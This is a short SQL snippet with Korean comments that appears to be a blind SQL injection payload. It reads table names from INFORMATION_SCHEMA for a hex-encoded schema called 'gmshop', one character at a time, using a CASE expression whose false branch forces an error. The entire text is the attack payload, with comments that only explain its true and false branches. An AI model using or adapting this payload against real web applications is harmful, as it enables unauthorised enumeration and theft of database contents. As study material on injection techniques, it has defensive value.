SELECT (
    CASE
        WHEN (ORD(MID((SELECT DISTINCT(IFNULL(CAST(table_name AS NCHAR),0x20))
                 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x676d73686f70 LIMIT 46, 1),15,1))>1)
        THEN 0x6e616d65 -- name (When 조건 만족시)
        ELSE (SELECT 7738 UNION SELECT 9719) -- (when 조건 불만족시)
    END
    )
)
